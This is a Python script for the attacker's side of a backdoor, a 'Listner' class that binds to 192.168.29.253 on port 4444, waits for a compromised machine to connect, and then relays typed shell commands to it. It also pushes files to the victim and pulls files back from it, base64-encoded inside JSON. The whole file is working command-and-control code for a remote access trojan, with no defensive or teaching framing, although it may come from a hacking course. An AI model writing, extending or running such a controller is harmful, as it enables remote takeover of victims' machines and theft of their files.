import socket,json,subprocess,base64
class Listner:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #to rreuse the socket when the connection is disconnected
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting For Connection")
        self.conn,addr=listener.accept()
        self.check()
    def prints(self):
        print("|    BACKDOOR    |")
    def reliables_send(self,d):
        json_data=json.dumps(d)
        self.conn.send(json_data.encode())
    def upload(self,path):
        with open(path,"rb") as file:
            return(base64.b64encode(file.read()).decode())
    def download(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
    def reliable_recieve(self):
        x=b""
        while True:
            try: #to get larger value or big data so that the data box is fully recieved b4 the convertion
                x=x+self.conn.recv(1024)
                return json.loads(x)
            except:
                continue

    def check(self):
        self.prints()
        while True:
            x=input(">>").split()
            if x[0]=="exit":
                self.reliables_send(x)
                quit()
            elif x[0]=="clear":
                subprocess.call("clear",shell=True)
            elif x[0]=="upload":
                content=self.upload(x[1])
                x.append(content)
                self.reliables_send(x)
                y=self.reliable_recieve()
                print(y)
            elif x[0]=="download":
                self.reliables_send(x)
                y=self.reliable_recieve()
                if y!="[+] NO FILE FOUND[+]":
                    self.download(x[1],y)
                    print("[+] DOWNLOADED [+]")
                else:
                    print(y)
            else:
                self.reliables_send(x)
                y=self.reliable_recieve()
                print(y)


x=Listner("192.168.29.253",4444)
